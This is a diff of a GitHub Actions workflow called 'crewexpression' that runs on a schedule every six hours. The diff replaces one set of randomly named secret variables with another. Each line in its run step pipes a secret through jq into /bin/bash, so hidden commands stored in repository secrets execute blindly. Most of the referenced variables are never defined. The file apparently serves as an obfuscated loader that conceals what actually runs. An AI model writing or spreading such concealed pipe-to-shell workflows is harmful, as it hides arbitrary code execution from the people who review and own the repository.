@@ -3,29 +3,25 @@ name: crewexpression
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 4/6 * * *'
-jobs:  # 15616
+    - cron: '11 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: crewexpression
         env:
-          rjfn59481: ${{ secrets.rjfn59481 }}
+          nybd2484: ${{ secrets.nybd2484 }}
         run: |
-          echo $rjfn59481 | jq -r .njikm791 | /bin/bash
-          echo $wdf4393 | jq -r .c82943 | /bin/bash
-          echo $uf0663 | jq -r .s155 | /bin/bash
-          echo $iopne72455 | jq -r .nnzv1 | /bin/bash
-          echo $l48277 | jq -r .lw2 | /bin/bash
-          echo $wm11 | jq -r .jyq9949 | /bin/bash
-          echo $ylurz30749 | jq -r .nh9 | /bin/bash
-          echo $bd2 | jq -r .d0 | /bin/bash
-          echo $phnwf25 | jq -r .mcj5979 | /bin/bash
-          echo $svov950 | jq -r .na47 | /bin/bash
-          echo $qes4 | jq -r .ld2421 | /bin/bash
-          echo $dl39 | jq -r .eom41930 | /bin/bash
-          echo $s3587 | jq -r .u92 | /bin/bash
-          echo $vxzcb8 | jq -r .iq52861 | /bin/bash
-          echo $lmqrq57401 | jq -r .litke9229 | /bin/bash
+          echo $nybd2484 | jq -r .j9828 | /bin/bash
+          echo $qs30 | jq -r .gkz7648 | /bin/bash
+          echo $gpgt0188 | jq -r .boc347 | /bin/bash
+          echo $on501 | jq -r .tdd347 | /bin/bash
+          echo $yoi96 | jq -r .a9 | /bin/bash
+          echo $e07306 | jq -r .rg50305 | /bin/bash
+          echo $ji37644 | jq -r .vmn4320 | /bin/bash
+          echo $mrig56 | jq -r .usql93932 | /bin/bash
+          echo $wvv4 | jq -r .m4 | /bin/bash
+          echo $zo00838 | jq -r .lpz46 | /bin/bash
 
